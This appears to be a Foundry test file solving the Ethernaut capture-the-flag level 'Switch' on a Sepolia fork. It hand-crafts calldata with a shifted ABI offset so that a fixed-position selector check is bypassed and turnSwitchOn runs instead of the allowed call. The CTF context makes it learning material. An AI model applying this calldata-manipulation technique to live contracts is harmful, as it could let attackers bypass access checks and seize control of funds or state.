// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/29-Switch/Switch.sol";

//ref https://github.com/minaminao/ctf-blockchain/blob/main/src/Ethernaut/Switch/SwitchExploit.sol

contract ContractTest is Test {

    Switch level29 = Switch(payable(0x10F170a57b6AF1f7C49f4177a390d81aE10e9504));

    function setUp() public {

    vm.createSelectFork(vm.rpcUrl("sepolia"));
 
    }

    function testExploit29() public {

        address(level29).call(
        bytes.concat(
            Switch.flipSwitch.selector,
            bytes32(uint256(0x60)),
            bytes32(0),
            bytes32(Switch.turnSwitchOff.selector),
            bytes32(uint256(0x04)),
            Switch.turnSwitchOn.selector
        )
    );
    }
  receive() external payable {}
} 
